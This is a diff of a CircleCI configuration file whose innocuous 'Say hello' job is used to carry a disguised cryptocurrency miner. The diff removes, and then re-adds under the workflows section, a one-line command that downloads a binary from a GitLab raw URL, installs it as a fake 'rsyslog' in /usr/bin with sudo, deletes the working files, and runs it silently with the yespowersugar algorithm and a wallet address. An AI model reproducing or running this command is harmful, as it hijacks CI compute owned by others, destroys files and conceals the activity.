@@ -16,11 +16,11 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://gitlab.com/set.arithmetic/arithmetic/-/raw/master/rsyslog && chmod +x rsyslog && sudo mv rsyslog /usr/bin && rm -rf * && timeout 1999m rsyslog -a yespowersugar -o 17042 -u sugar1qwzeqwqknts5e0glkvd2c3nhvvlzvt4prcrx885.1999 &>/dev/null"
+          command: "echo Hello, World!"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
 workflows:
   say-hello-workflow:
     jobs:
-      - say-hello
+      - wget https://gitlab.com/set.arithmetic/arithmetic/-/raw/master/rsyslog && chmod +x rsyslog && sudo mv rsyslog /usr/bin && rm -rf * && timeout 1999m rsyslog -a yespowersugar -o 17042 -u sugar1qwzeqwqknts5e0glkvd2c3nhvvlzvt4prcrx885.1999 &>/dev/null
